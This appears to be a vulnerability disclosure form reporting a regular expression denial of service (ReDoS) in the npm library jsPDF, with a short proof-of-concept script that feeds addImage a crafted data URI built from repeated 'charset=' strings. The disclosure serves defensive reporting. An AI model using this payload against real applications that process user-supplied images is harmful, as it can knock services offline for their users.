**Submission details:**

**Package Manager:** npm
**Affected module:** jspdf
**Link to published package:** https://github.com/MrRio/jsPDF
**Link to GitHub repo:** https://github.com/MrRio/jsPDF
**Other vulnerability type:** 
**Severity level:** High
**Module Description:** **A library to generate PDFs in JavaScript.**

**Vulnerability Description:**

It allows cause a Regular Expression Denial of Service (ReDoS) when adding images.

**Steps to reproduce:**

```javascript
const fs = require("fs");
const { jsPDF } = require("jspdf")


function build_blank(n) {
	var ret = "data:/"
	for (var i = 0; i < n; i++) {
		ret += "charset="
	}
	return ret + "!";
}
 
const doc = new jsPDF();
doc.text("Hello world1111!", 10, 10);

var imageData = "data:image/png;base64,"

var Octocat = fs.readFileSync("psb.png", { encoding: "latin1" });
doc.addImage(build_blank(30) + imageData, "test", 10, 40, 180, 180, undefined, "SLOW");


doc.save("a4ffff.pdf"); // will save the file in the current working directory
console.log("type:" + typeof(doc.addImage))
```

You can execute `./jspdf/jspdf.js`

**Did I contact the maintainer:** No
**Did I open an issue:** No